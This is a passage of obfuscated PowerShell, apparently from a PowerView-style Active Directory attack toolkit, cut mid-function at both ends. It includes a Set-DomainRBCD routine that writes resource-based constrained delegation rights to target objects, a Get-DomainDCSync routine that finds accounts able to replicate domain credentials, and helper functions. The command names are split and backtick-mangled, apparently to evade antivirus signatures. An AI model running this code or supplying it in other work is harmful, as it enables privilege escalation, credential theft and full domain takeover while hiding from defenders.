        if (${p`S`Bo`UnDpArAMETERS}[("{0}{1}{2}"-f 'Se','curity','Masks')]) { ${s`eARcheRARgU`M`eNtS}[("{1}{2}{0}" -f'yMasks','Secur','it')] = ${S`EcurITYmA`skS} }
        if (${Ps`B`oUnDPaRaM`e`Te`RS}[("{1}{2}{0}" -f'tone','Tomb','s')]) { ${sEA`RCH`E`R`ARGUMEnTs}[("{1}{0}{2}"-f 'ombst','T','one')] = ${tOM`Bs`T`one} }
        if (${psbOUNdpaR`Ame`Te`RS}[("{2}{0}{1}"-f 'dentia','l','Cre')]) { ${seAR`CHeRARgU`MeN`TS}[("{0}{2}{1}"-f'Credent','al','i')] = ${Cr`eDE`N`TiaL} }
        ${r`B`C`dsEarCHER} = &("{0}{1}{4}{5}{2}{3}"-f'G','et','a','rcher','-Dom','ainSe') @SearcherArguments
    }

    PROCESS {
        
        if (${p`s`BounDP`A`RAM`EtErs} -and (${P`sBoundp`A`RAmEtE`Rs}."CO`UNt" -ne 0)) {
            &("{2}{0}{1}{3}" -f 'ew','-Dyna','N','micParameter') -CreateVariables -BoundParameters ${PSBou`NdP`Ar`Ame`T`ERs}
        }
        if (${R`Bcd`sEa`RCH`Er}) {
            ${Id`eNT`iTyFiLter} = ''
            ${Fi`Lt`Er} = ''

            
            ${s`ddLStr`InG} = ''
            if (${p`sb`oUNDPara`me`TerS}[("{3}{1}{2}{0}"-f'om','e','gateFr','Del')]) {
                ${DElE`gAtE`FiLt`ER} = ''
                ${DEL`egaTE`FR`oM}.("{0}{1}"-f'Spli','t').Invoke('|') | &("{5}{1}{3}{4}{0}{2}"-f'rin','ityFi','g','lter','St','Get-Ident') | &("{2}{1}{0}{3}" -f 'e','ach-Obj','ForE','ct') {
                    ${dEL`eGAT`eFi`lT`ER} += ${_}
                    &("{1}{0}{2}" -f'te-Verbo','Wri','se') ('[Se'+'t-DomainRB'+'CD'+'] '+'Ap'+'pendi'+'ng '+'D'+'el'+'egateFil'+'ter: '+"$_")
                }

                ${R`BCd`SEA`R`CHEr}."fi`LTER" = "(|$DelegateFilter)"
                &("{3}{2}{1}{0}" -f 'e','rbos','-Ve','Write') "[Set-DomainRBCD] Set-DomainRBCD filter string: $($RBCDSearcher.filter) "
                ${rE`S`UltS} = ${rb`Cdse`A`RC`hER}.("{1}{0}{2}" -f'indA','F','ll').Invoke()
                if (${RESUl`TS}) {
                    ${SDD`l`stRI`Ng} = ("{1}{0}{2}" -f'A','O:B','D:')
                }
                ${R`esUL`Ts} | &("{1}{2}{0}" -f'ect','Where','-Obj') {${_}} | &("{1}{2}{3}{0}" -f'ct','F','orEac','h-Obje') {
                    ${O`BjeCT} = &("{1}{3}{0}{2}" -f't-LDAP','Conve','Property','r') -Properties ${_}."prO`pErt`iEs"
                    ${oB`JECt}."pSo`BjE`Ct"."T`yPENa`MEs".("{0}{1}"-f 'In','sert').Invoke(0, ("{5}{0}{2}{1}{4}{3}" -f'erView.','DO','A','ct','bje','Pow'))
                    ${sd`D`lst`RINg} += "(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($Object.objectsid))"
                    &("{0}{1}{2}"-f'Write-V','erbos','e') "[Set-DomainRBCD] Appending to SDDL string: (A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($Object.objectsid)) "
                }
                if (${res`U`lTs}) {
                    try { ${RESU`LTs}.("{1}{2}{0}"-f 'e','disp','os').Invoke() }
                    catch {
                        &("{2}{0}{1}" -f 'rite','-Verbose','W') ('[Set-'+'Domai'+'n'+'R'+'BCD] '+'E'+'r'+'ror '+'d'+'isposin'+'g '+'of'+' '+'t'+'he '+'Resul'+'ts '+'o'+'bjec'+'t: '+"$_")
                    }
                }
                &("{3}{1}{0}{2}"-f '-Verbos','rite','e','W') ('[Set-Do'+'m'+'a'+'i'+'n'+'RBCD] '+'Usi'+'ng '+'SDDL'+' '+'s'+'trin'+'g: '+"$SDDLString")
                ${s`D} = &("{0}{1}{2}" -f'N','ew-Obj','ect') ("{7}{3}{2}{4}{0}{5}{6}{1}"-f'c','SecurityDescriptor','ity','r','.Ac','e','ssControl.Raw','Secu') -ArgumentList ${SDdlS`T`RInG}
                ${SdBy`TES} = &("{2}{1}{0}" -f'ct','w-Obje','Ne') ("{1}{0}" -f'[]','byte') (${S`D}."bI`N`A`RYlENGTh")
                ${sd}.("{1}{0}{2}" -f'Bin','Get','aryForm').Invoke(${sDb`y`TES}, 0)

            }
            
            ${i`DE`Nt`itYPARTS} = ${idE`Nt`Ity} -split '\\'
            if (${i`Den`T`iT`YpARtS}."le`NG`TH" -gt 1) {
                ${sEa`RC`hEr`ArGuM`eN`Ts}[("{0}{1}{2}" -f'D','om','ain')] = ${Id`E`NtItYp`ArTS}[0]
                ${I`DENT`ItY} = ${iDE`N`TIty`p`ARTS}[1]
            }
            ${I`denTItyS`EAr`c`HEr} = &("{1}{3}{0}{2}"-f'he','Get-Domain','r','Searc') @SearcherArguments
            ${I`dEnt`Ity} | &("{7}{0}{5}{3}{1}{2}{6}{4}"-f 'et-','i','tyFi','nt','g','Ide','lterStrin','G') | &("{1}{2}{0}"-f't','ForEac','h-Objec') {
                ${idE`N`T`I`TYFiLtEr} += ${_}
            }
            if (${iDE`NtItyfi`lt`er} -and (${IdEn`T`ItYfi`LteR}.("{0}{1}" -f'T','rim').Invoke() -ne '') ) {
                ${fi`l`Ter} = "(|$IdentityFilter)"
            }

            if (${pSbOUn`dPARa`MEtE`RS}[("{2}{0}{1}" -f 'ilt','er','LDAPF')]) {
                &("{1}{2}{3}{0}"-f 'ose','W','ri','te-Verb') ('[Se'+'t'+'-DomainRBC'+'D]'+' '+'Using'+' '+'a'+'dditional'+' '+'LDAP'+' '+'fil'+'ter'+': '+"$LDAPFilter")
                ${FI`lT`ER} += "$LDAPFilter"
            }
            if (${Fi`ltER} -and ${Fil`TeR} -ne '') {
                ${iD`E`N`TiTySeARC`h`eR}."fIlT`Er" = "(&$Filter)"
            }
            &("{3}{0}{1}{2}"-f'-Verb','os','e','Write') "[Set-DomainRBCD] Set-DomainRBCD filter string: $($RBCDSearcher.filter) "

            if (${ps`BOu`NdP`ARAM`etErS}[("{1}{0}{2}"-f 'dO','Fin','ne')]) { ${re`S`UlTs} = ${RbCD`S`eaRChEr}.("{0}{2}{1}" -f 'F','ne','indO').Invoke() }
            else { ${Resu`LtS} = ${IdENtiTYSe`ArC`H`er}.("{0}{1}{2}" -f'Fi','n','dAll').Invoke() }
            ${R`ESu`LTS} | &("{2}{0}{1}{3}" -f 'e-Obj','e','Wher','ct') {${_}} | &("{0}{2}{1}" -f'F','Object','orEach-') {
                ${OB`ject} = ${_}
                ${O`BJect}."pS`o`BjeCT"."tYpE`NAmEs".("{1}{0}"-f 'rt','Inse').Invoke(0, ("{0}{3}{2}{1}{4}"-f'Po','bje','ADO','werView.','ct.Raw'))
                ${eN`TRy} = ${obj`Ect}.("{4}{2}{1}{0}{3}" -f 'ectoryEn','ir','tD','try','Ge').Invoke()
                try {
                    &("{0}{1}{2}" -f'Writ','e-V','erbose') "[Set-DomainRBCD] Setting 'msds-allowedtoactonbehalfofotheridentity' to '$SDBytes' for object '$($Object.Properties.samaccountname)' "
                    if (${Sd`ByT`ES}) {
                        ${EN`TRy}.("{1}{0}"-f't','pu').Invoke(("{6}{5}{7}{1}{3}{0}{2}{8}{4}" -f'otheride','edtoactonbehalf','nt','of','ty','l','msds-a','low','i'), ${S`Dby`Tes})
                    }
                    elseif (${P`S`B`OUNdpArAME`Ters}[("{1}{0}"-f'ar','Cle')]) {
                        ${e`NT`Ry}."Pr`oPer`TiEs"[("{2}{8}{10}{6}{4}{9}{7}{3}{1}{5}{0}" -f'y','ide','msd','ther','eh','ntit','owedtoactonb','ofo','s-','alf','all')].("{1}{0}" -f'r','Clea').Invoke()
                    }
                    ${e`Nt`Ry}.("{2}{0}{1}{4}{3}"-f 'mmitc','han','co','es','g').Invoke()
                }
                catch {
                    &("{1}{0}{2}"-f'e-War','Writ','ning') "[Set-DomainRBCD] Error setting/replacing properties for object '$($Object.Properties.samaccountname)' : $SDBytes "
                }

            }
            if (${REsU`lTs}) {
                try { ${r`E`SuLTs}.("{1}{0}"-f 'pose','dis').Invoke() }
                catch {
                    &("{1}{2}{0}"-f 'se','Write-','Verbo') ('[Set-Do'+'mai'+'n'+'RBCD]'+' '+'Err'+'o'+'r '+'disp'+'os'+'ing'+' '+'of'+' '+'th'+'e '+'Resul'+'t'+'s '+'obje'+'c'+'t: '+"$_")
                }
            }
            ${R`BcdSEAR`cHEr}.("{0}{1}{2}"-f 'd','i','spose').Invoke()
        }
    }
}

function gET-iDEN`T`I`TyF`ILtErs`Tr`Ing {

    [OutputType([String])]
    [CmdletBinding()]
    Param (
        [Parameter(posItioN = 0, VALUEFROMPIpELiNE = ${tr`UE}, VAlUEFroMPIPeLiNebYpRoPErTyNaME = ${T`Rue})]
        [Alias({"{1}{2}{0}"-f 'me','SamAccoun','tNa'}, {"{0}{1}" -f'N','ame'}, {"{0}{1}{2}" -f 'DNSHos','tN','ame'})]
        [String[]]
        ${IdE`N`TiTY}
    )

    BEGIN {
        ${S`eAr`Cher`ARg`U`MeNTS} = @{}
    }

    PROCESS {
        ${Id`e`NtiTYfI`lTeR} = ''
        ${FILt`er} = ''
        ${I`DenTiTy} | &("{0}{2}{1}" -f 'Where-','t','Objec') {${_}} | &("{3}{4}{2}{1}{0}"-f 'ject','h-Ob','c','F','orEa') {
            ${IdE`N`TiTyI`Nstan`CE} = ${_}.("{1}{0}"-f 'eplace','R').Invoke('(', '\28').("{0}{2}{1}"-f 'R','ace','epl').Invoke(')', '\29')
            if (${IdentityI`N`stAN`Ce} -match ("{1}{0}"-f'1-','^S-')) {
                ${IdEntI`Ty`F`IlTeR} += "(objectsid=$IdentityInstance)"
            }
            elseif (${iDE`N`Tity`Ins`TANce} -match ((("{1}{0}{2}{3}" -f 'rO','^(CNFu','UFurD','C)='))."r`epLAce"(([ChAr]70+[ChAr]117+[ChAr]114),[STRiNG][ChAr]124))) {
                ${i`DeNTiT`y`Filt`Er} += "(distinguishedname=$IdentityInstance)"
                if ((-not ${pS`B`ounD`PARamETeRS}[("{0}{1}"-f'Dom','ain')]) -and (-not ${PSbO`UNdpARA`mEt`E`Rs}[("{2}{1}{0}" -f 'ase','hB','Searc')])) {
                    
                    
                    ${I`DE`NT`ItY`domaIN} = ${ID`Ent`ITyI`NSt`A`NcE}.("{1}{3}{2}{0}"-f'ring','Su','t','bS').Invoke(${iD`EnTit`YIN`Stan`CE}.("{2}{0}{1}"-f 'ndex','Of','I').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                    &("{0}{2}{1}"-f'Write','Verbose','-') ('[Ge'+'t'+'-Identit'+'y'+'FilterString]'+' '+'Extra'+'cte'+'d '+'doma'+'in '+"'$IdentityDomain' "+'f'+'rom '+"'$IdentityInstance'")
                    
                    
                        
                    
                }
            }
            elseif (${IdeNTitY`in`st`ANCE} -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                ${g`UId`B`Yt`EStrINg} = (([Guid]${idE`NT`ItYiN`S`Tance}).("{3}{1}{2}{0}" -f 'ay','yteA','rr','ToB').Invoke() | &("{2}{4}{0}{1}{3}" -f'ac','h-O','Fo','bject','rE') { '\' + ${_}.("{0}{1}" -f'ToStri','ng').Invoke('X2') }) -join ''
                ${idEn`TiT`Y`FIlTEr} += "(objectguid=$GuidByteString)"
            }
            elseif (${iDeNt`itYIN`Sta`Nce}.("{1}{0}"-f 'ontains','C').Invoke('\')) {
                ${co`NvEr`T`eDI`deN`T`ItyInsta`Nce} = ${ID`en`Tity`iNstAN`Ce}.("{1}{0}{2}" -f'pla','Re','ce').Invoke('\28', '(').("{2}{1}{0}"-f'ce','pla','Re').Invoke('\29', ')') | &("{1}{0}{2}{3}"-f'ADN','Convert-','a','me') -OutputType ("{2}{1}{0}" -f 'onical','an','C')
                if (${C`ONv`ERT`edID`ENti`TYinsTAn`cE}) {
                    ${OBJE`C`TdO`MaiN} = ${cOn`VeRTEdID`eNtiT`YINs`T`Ance}.("{1}{0}" -f'tring','SubS').Invoke(0, ${co`NVerTe`DIDEntIT`Y`i`Ns`T`ANce}.("{0}{1}{2}" -f 'Ind','exO','f').Invoke('/'))
                    ${O`B`JEct`NAMe} = ${I`deN`Tit`YIn`sTAncE}.("{0}{1}"-f'Spli','t').Invoke('\')[1]
                    ${iDe`Nt`I`TyfIlT`er} += "(samAccountName=$ObjectName)"
                    
                    &("{2}{0}{1}" -f 'te-Verbo','se','Wri') ('['+'Get'+'-Iden'+'tit'+'yFilterSt'+'r'+'i'+'ng] '+'E'+'xtra'+'cted '+'do'+'mai'+'n '+"'$ObjectDomain' "+'f'+'rom '+"'$IdentityInstance'")
                }
            }
            elseif (${IdEn`Tity`i`NstA`Nce}.("{0}{2}{1}"-f 'Cont','ns','ai').Invoke('.')) {
                ${ideNt`it`YfI`lTER} += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance)(dnshostname=$IdentityInstance))"
            }
            else {
                ${IdEn`TIt`yfIl`TER} += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance)(displayname=$IdentityInstance))"
            }
        }
        if (${I`dENTiTyf`i`lter} -and (${id`eNTiTyf`I`LTeR}.("{1}{0}" -f 'rim','T').Invoke() -ne '') ) {
            ${Fi`LtEr} += "(|$IdentityFilter)"
        }
        ${Fi`LTER}
    }
}



function g`e`T-d`oMAi`NDcSynC {

    [OutputType({"{3}{2}{1}{0}"-f 'ADObject','w.','e','PowerVi'})]
    [OutputType({"{5}{0}{3}{6}{1}{2}{4}" -f 'rVie','je','ct.Ra','w.AD','w','Powe','Ob'})]
    [CmdletBinding()]
    Param (
        [Switch]
        ${U`sERs},

        [Switch]
        ${co`M`P`UterS},

        [Switch]
        ${g`RoU`Ps},

        [ValidateNotNullOrEmpty()]
        [String]
        ${Do`MAIN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}"-f'Fil','ter'})]
        [String]
        ${lDa`P`FIL`Ter},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${PRO`Pe`RT`IES},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{0}{1}"-f 'a','th','ADSP'})]
        [String]
        ${S`EaRcH`BASE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{3}{0}{1}" -f'ntrolle','r','D','omainCo'})]
        [String]
        ${sEr`V`eR},

        [ValidateSet({"{1}{0}" -f'ase','B'}, {"{2}{0}{1}"-f'ev','el','OneL'}, {"{1}{0}{2}" -f 'btre','Su','e'})]
        [String]
        ${SE`AR`cH`ScOpe} = ("{2}{1}{0}"-f 'ee','tr','Sub'),

        [ValidateRange(1, 10000)]
        [Int]
        ${REs`UlTpAg`ESIZe} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${sER`V`eRtiM`eLI`mIt},

        [ValidateSet({"{1}{0}" -f 'l','Dac'}, {"{0}{1}"-f 'G','roup'}, {"{0}{1}" -f'Non','e'}, {"{1}{0}" -f 'er','Own'}, {"{1}{0}"-f'l','Sac'})]
        [String]
        ${SecURIt`y`ma`sKs},

        [Switch]
        ${TOMb`S`TOnE},

        [Alias({"{2}{0}{1}"-f'rn','One','Retu'})]
        [Switch]
        ${fIN`Done},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`R`EdEnT`IAL} =   ${7`Tq02}::"eM`PTy",

        [Switch]
        ${R`Aw}

    )

    BEGIN {
        ${SEa`RchER`ARGUME`N`TS} = @{}
        ${DnSeA`RcHEr`ARG`U`MenTs} = @{}
        if (${p`SbOuNd`Pa`RA`MEteRs}[("{0}{1}"-f 'D','omain')]) { ${S`E`AR`CHErA`RGUMentS}[("{0}{1}" -f 'Do','main')] = ${D`OmaIN}; ${Dn`sEa`RcHErArGumen`TS}[("{0}{1}"-f 'Domai','n')] = ${Do`MAIn} }
        if (${PsbO`U`NdpAramet`ERs}[("{2}{1}{0}" -f 's','e','Properti')]) { ${S`EarCHeraRGu`me`N`TS}[("{1}{2}{0}"-f 'es','Prope','rti')] = ${pR`opert`ieS} }
        if (${P`s`BoUn`Dpar`AmEt`ers}[("{1}{0}{2}"-f'ar','Se','chBase')]) { ${SEa`Rc`hE`RA`RguMENTS}[("{1}{3}{2}{0}"-f 'chBase','Se','r','a')] = ${s`e`ArC`HBAsE} }
        if (${Ps`BOUNDP`AR`AMET`e`Rs}[("{1}{0}" -f'er','Serv')]) { ${S`EaR`chERaRgu`MEntS}[("{0}{1}"-f'Ser','ver')] = ${Se`Rver}; ${DnSEArCh`E`RArG`UmE`NtS}[("{0}{2}{1}" -f'Se','er','rv')] = ${sErV`eR} }
        if (${pSbOu`ND`pa`R`AMETErs}[("{2}{0}{3}{1}"-f'rchS','e','Sea','cop')]) { ${sEARchE`RA`RGUmE`Nts}[("{1}{2}{0}{3}"-f 'Sco','Se','arch','pe')] = ${SearC`H`SCo`pE} }
        if (${psb`OuNDPar`Am`EterS}[("{0}{1}{4}{2}{3}" -f 'Resu','lt','eSi','ze','Pag')]) { ${se`A`RCheRA`RguM`ENTS}[("{2}{0}{1}" -f'tPa','geSize','Resul')] = ${re`s`Ul`TPAgEsIze} }
        if (${psBOUnDp`ARAmE`TE`Rs}[("{0}{1}{2}"-f'ServerTi','meLimi','t')]) { ${sea`RchEr`A`Rgu`mE`NTS}[("{2}{1}{0}{4}{3}" -f'ver','r','Se','Limit','Time')] = ${seR`Ver`TImE`LiMIt} }
        if (${PSBou`NDpA`R`AmeTe`RS}[("{0}{1}{2}{3}" -f 'Sec','urity','Mas','ks')]) { ${seA`R`cHE`Ra`RGU`mEnts}[("{1}{0}{2}"-f 'ecurityMa','S','sks')] = ${Sec`U`RIt`YM`AsKs} }
        if (${PsB`OU`NdpA`RaMeT`eRs}[("{1}{0}{2}" -f 'bs','Tom','tone')]) { ${S`Ea`RCheraRgu`M`Ents}[("{1}{2}{0}"-f 'ne','Tomb','sto')] = ${toMbs`TO`Ne} }
        if (${p`SB`O`UnDpaRa`mEte`RS}[("{0}{3}{2}{1}"-f'Cre','l','tia','den')]) { ${SeAr`CHeRarGU`M`E`N`TS}[("{2}{1}{0}{3}"-f 'ntia','ede','Cr','l')] = ${CRe`dEnt`IAL} }
        ${obj`EctS`EArCH`ER} = &("{5}{4}{1}{0}{2}{3}"-f'Sea','omain','rc','her','t-D','Ge') @SearcherArguments
    }

    PROCESS {
        ${D`oMAi`NdN} = &("{0}{1}{2}" -f'G','et-Dom','ainDN') @DNSearcherArguments
        &("{1}{2}{0}"-f'rbose','Write','-Ve') ('[Get-'+'Do'+'mainDCSync'+'] '+'R'+'et'+'rieved '+'t'+'he '+'d'+'om'+'ain '+'distingu'+'is'+'hedn'+'ame:'+' '+"$DomainDN")

        
        ${p`Ri`VS} = @{}

        
        ${N`O`TYpe} = ${Tr`UE}
        if (${PS`Bo`UndparAme`T`ErS}[("{1}{0}"-f 'rs','Use')] -or ${PSBo`Un`dPARAmeT`e`Rs}[("{1}{0}{2}" -f'mpute','Co','rs')] -or ${PSBOuN`dPArA`me`TE`Rs}[("{1}{0}" -f 'ps','Grou')]) {
            ${NOt`Ype} = ${f`ALSe}
        }

        
        &("{6}{1}{4}{3}{0}{2}{5}"-f 'O','et','bject','main','-Do','ACL','G') ${DO`maIN`dN} -RightsFilter DCsy`Nc @SearcherArguments | &("{1}{0}{2}"-f'Each','For','-Object') {
            ${A`cE} = ${_}
            ${s`iD} = ${A`CE}."s`eCUrI`Ty`IDEN`TIfIer"."vA`lue"
            ${adRI`G`HTS} = ${A`ce}."aCtiveD`ir`ECt`o`RyrIghTS"
            if (${a`Drig`hts} -eq ("{0}{2}{1}" -f'Gene','ll','ricA') -or (${aD`Rig`h`Ts} -eq ("{2}{1}{0}{3}{4}"-f'ten','x','E','dedRi','ght') -and !(${a`ce}."OB`jEc`T`AcEtY`PE") -and !(${A`cE}."iNherI`T`E`DoBjECta`cETYpE"))) {
                ${pRI`VS}.${S`iD} = @(("{5}{1}{6}{3}{8}{0}{4}{7}{2}" -f'-00','-9c','d2','9','c04','1131f6aa','07-11d1-f7','fc2dc','f'), ("{5}{7}{4}{3}{0}{2}{1}{8}{6}"-f'1','f','d1-','1','7-','1131f6','9f-00c04fc2dcd2','ad-9c0','7'))
            }
            else {
                ${aCE`T`YPE} = ${A`Ce}."o`BjectAC`et`YPe"."g`UId"
                if (!(${Pr`ivS}."K`EYs" -contains ${S`id})) {
                    ${P`RIvS}.("{1}{0}" -f 'd','Ad').Invoke(${S`id}, @(${A`Cety`Pe}))
                }
                elseif (!(${pR`ivS}.${S`ID} -contains ${aC`eT`ypE})) {
                    ${Pr`IVS}.${s`Id} += ${AC`e`TYpe}
                }
            }
        }

        
        ${F`iLtEr} = ''
        ${tYpEfIl`T`Er} = ''
        ${iDeNT`iT`yfiLtER} = ''
        if (${PsboUn`DpAR`AME`T`eRs}[("{1}{0}"-f 'ers','Us')]) {
            ${tYP`E`FiLTEr} += (("{3}{4}{0}{6}{5}{1}{2}"-f'ountTy','368',')','(samAc','c','805306','pe='))
        }
        if (${PSb`oUNDparAM`ET`ERS}[("{2}{1}{0}" -f'uters','omp','C')]) {
            ${typef`I`ltER} += ("{4}{3}{5}{1}{0}{2}{6}"-f'Type=8','unt','053','cc','(samA','o','06369)')
        }
        if (${pSbOUnD`pArAME`T`eRS}[("{1}{0}" -f'ups','Gro')]) {
            ${typEFIl`T`eR} += (("{2}{6}{5}{3}{4}{1}{0}"-f 'up)','ory=gro','(o','c','tCateg','je','b'))
        }
        if (${t`YpEfiLt`ER} -and (${TyP`E`F`IlTeR}.("{0}{1}" -f'T','rim').Invoke() -ne '')) {
            ${FIl`TEr} = "(|$TypeFilter)"
        }
        else {
            ${FIl`TER} = (((("{9}{6}{0}{5}{8}{2}{1}{7}{3}{4}"-f'c','untType=80','mAcco','69','))','co','amA','53063','untType=805306368)(sa','({0}(s'))-F[CHAr]124))
        }

        
        ${Ch`E`ck} = @()

        ${pR`I`VS}."k`Eys" | &("{1}{0}{4}{2}{3}" -f 'h-','ForEac','e','ct','Obj') {
            if (${P`Rivs}.${_}.("{0}{1}{2}"-f 'Contai','n','s').Invoke(("{1}{0}{6}{2}{4}{3}{5}" -f '31f6aa-9c','11','7','04','9f-00c','fc2dcd2','07-11d1-f')) -and ${pr`iVS}.${_}.("{1}{0}{2}"-f'i','Conta','ns').Invoke(("{2}{5}{0}{7}{6}{10}{1}{8}{9}{3}{4}" -f'd-9c','00c0','1131f6','dcd','2','a','11d1-','07-','4f','c2','f79f-'))) {
                ${O`Bject} = &("{0}{1}{2}{3}" -f 'G','et','-Doma','inObject') ${_}
                if (${Ob`JE`ct}) {
                    ${oB`J`eCtsiD} = ${O`BjE`Ct}."o`BJE`CtSID"
                    if (${o`Bje`Ct}."objEC`Tc`LAsS" -contains ("{1}{0}"-f'p','grou')) {
                        if (${psBo`UNd`paRAM`eTeRS}[("{0}{1}" -f 'Gro','ups')] -and !(${cHE`ck} -contains ${OB`JecTs`iD})) {
                            ${i`DeNTIty`Fi`lteR} += "(objectsid=$ObjectSID)"
                        }
                        ${O`BjEct} | &("{5}{4}{2}{0}{3}{1}"-f 'mainGro','ember','-Do','upM','et','G') -Recurse @SearcherArguments | &("{2}{1}{3}{0}"-f 'ject','or','F','Each-Ob') {
                            ${Mem`BE`RSId} = ${_}."m`EMB`ErSID"
                            if (${_}."m`EmbeR`obJ`eCtCLa`SS" -ne ("{1}{0}" -f'roup','g') -and !(${Ch`Eck} -contains ${Mem`BE`RsID})) {
                                if ((${nO`TYpE}) -Or (((${p`SBoUndP`ARa`meTeRS}[("{1}{0}"-f 'rs','Use')]) -And (${_}."M`Ember`OB`JeCt`Class" -eq ("{0}{1}" -f 'us','er'))) -Or ((${P`s`BO`UndPara`mETeRs}[("{0}{1}" -f'Co','mputers')]) -And (${_}."me`Mb`e`RobJe`CTCLAss" -eq ("{1}{0}"-f'ter','compu'))))) {
                                    ${id`eN`Tit`YfIL`TeR} += "(objectsid=$MemberSID)"
                                }
                            }
                            elseif (!(${Ch`ecK} -contains ${member`S`id})) {
                                if (${psboUND`pa`Ra`MEte`RS}[("{1}{2}{0}" -f 'ps','Gro','u')]) {
                                    ${I`DenTI`TY`FIl`TER} += "(objectsid=$MemberSID)"
                                }
                            }
                            ${CH`EcK} += ${MeMB`E`RS`ID}
                        }
                    }
                    elseif (!(${C`h`ECK} -contains ${ObJe`cTs`ID})) {
                        if ((${noT`y`PE}) -Or (((${PSBoUN`DP`Ar`A`MeT`ERs}[("{0}{1}" -f'Us','ers')]) -And (${OB`Je`Ct}."SaMAcCo`UNtTy`Pe" -eq ("{0}{1}{2}{3}" -f 'US','ER','_OBJEC','T'))) -Or ((${PsbOUN`d`Par`AmEt`E`Rs}[("{1}{0}"-f 'uters','Comp')]) -And (${o`BJeCT}."sA`Ma`CCoUn`T`Type" -eq ("{3}{1}{2}{0}"-f'T','NE_AC','COUN','MACHI'))))) {
                            ${ID`E`NT`iTyf`Ilter} += "(objectsid=$ObjectSID)"
                        }
                    }
                    ${ch`e`cK} += ${oBj`Ec`TS`ID}
                }
            }
        }

        if (${I`d`en`TiTYfiLTer} -and (${ideN`TiT`Yf`IltER}.("{1}{0}" -f 'rim','T').Invoke() -ne '') ) {
            ${filT`ER} += "(|$IdentityFilter)"
        }

        if (${Ps`BouND`p`AR`AmE`TErs}[("{2}{1}{0}"-f'r','DAPFilte','L')]) {
            &("{3}{0}{2}{1}"-f'i','-Verbose','te','Wr') ('[Get-'+'Doma'+'i'+'nD'+'CSyn'+'c] '+'U'+'sing '+'add'+'it'+'iona'+'l '+'LD'+'AP '+'fil'+'ter:'+' '+"$LDAPFilter")
            ${fIl`T`er} += "$LDAPFilter"
        }

        if (${FiLt`eR} -and ${f`i`Lter} -ne '') {
            ${ObJECtS`EAR`C`HER}."fI`L`TEr" = "(&$Filter)"
        }
        &("{4}{0}{1}{2}{3}"-f'te','-','Verbos','e','Wri') "[Get-DomainDCSync] Get-DomainDCSync filter string: $($ObjectSearcher.filter) "

        if (${psboUNdPARaM`E`Te`Rs}[("{2}{1}{0}"-f 'One','ind','F')]) { ${Re`SU`ltS} = ${O`Bject`seAR`Ch`Er}.("{0}{2}{1}"-f 'Fin','One','d').Invoke() }
        else { ${rE`s`ULTS} = ${oB`J`eC`Tsearch`eR}.("{1}{0}" -f 'indAll','F').Invoke() }
        ${RE`sUL`TS} | &("{1}{2}{0}" -f'ject','Where-O','b') {${_}} | &("{4}{3}{1}{2}{0}"-f'bject','h-','O','ac','ForE') {
            if (${P`sbOu`NdpARametE`RS}['Raw']) {
                
                ${oB`jECT} = ${_}
                ${OBje`cT}."PSOb`j`eCt"."tYp`e`NAm`ES".("{1}{0}" -f 'nsert','I').Invoke(0, ("{3}{6}{1}{4}{0}{5}{2}" -f'.A','rV','bject.Raw','Po','iew','DO','we'))
            }
            else {
                ${obj`E`cT} = &("{3}{5}{6}{0}{1}{4}{2}"-f'-','LD','Property','C','AP','onve','rt') -Properties ${_}."ProP`erTi`eS"
                ${Ob`J`ecT}."PS`oBJe`cT"."TYP`Ena`MeS".("{2}{0}{1}" -f'er','t','Ins').Invoke(0, ("{2}{1}{0}{4}{3}" -f'w.AD','Vie','Power','ect','Obj'))
            }

            ${o`BjE`cT}
        }
        if (${R`Es`Ults}) {
            try { ${R`eSuL`Ts}.("{0}{1}"-f 'di','spose').Invoke() }
            catch {
                &("{1}{3}{0}{2}" -f 'b','Write','ose','-Ver') ('['+'Get-Domai'+'n'+'DCSync] '+'Err'+'or '+'disposi'+'ng'+' '+'o'+'f '+'the'+' '+'Resu'+'lts '+'o'+'bj'+'ect: '+"$_")
            }
        }
        ${O`BjE`c`TSEAR`ChEr}.("{1}{0}"-f'se','dispo').Invoke()

    }
}

function Ge`T`-`dOmAi`NO`BjEcTSD {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{2}{1}" -f'PSShouldP','ss','roce'}, '')]
    [OutputType([PSObject])]
    [CmdletBinding()]
    Param (
        [Parameter(pOSItIOn = 0, VaLuefrOmPipelinE = ${T`RuE}, vaLueFRompIpELInEbYPropERtYNAmE = ${TR`Ue})]
        [Alias({"{0}{2}{3}{4}{1}"-f 'Dis','ame','tin','guish','edN'}, {"{1}{0}{3}{2}"-f'cco','SamA','ame','untN'}, {"{0}{1}" -f 'Na','me'})]
        [String[]]
        ${IdEn`T`ItY},

        [String]
        ${Ou`TF`ILe},

        [String]
        ${CH`e`cK},

        [ValidateNotNullOrEmpty()]
        [String]
        ${DOmA`IN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}{2}" -f'AD','SPa','th'})]
        [String]
        ${s`eA`RChbaSE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{1}{3}{0}{4}" -f 'rolle','ain','Dom','Cont','r'})]
        [String]
        ${se`RvER},

        [ValidateSet({"{1}{0}"-f 'se','Ba'}, {"{0}{1}{2}"-f 'O','neLeve','l'}, {"{0}{2}{1}"-f 'S','ee','ubtr'})]
        [String]
        ${s`Ea`RCHsCOPE} = ("{0}{1}"-f'Subtr','ee'),

        [ValidateRange(1, 10000)]
        [Int]
        ${ReSu`Ltp`AG`ESi`ZE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SERVert`Ime`Li`mIt},

        [Switch]
        ${toMB`Sto`NE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`Re`deNtIAl} =   ${7`Tq02}::"e`mptY"
    )

    BEGIN {
        ${seAr`ChERaRg`U`MENTs} = @{
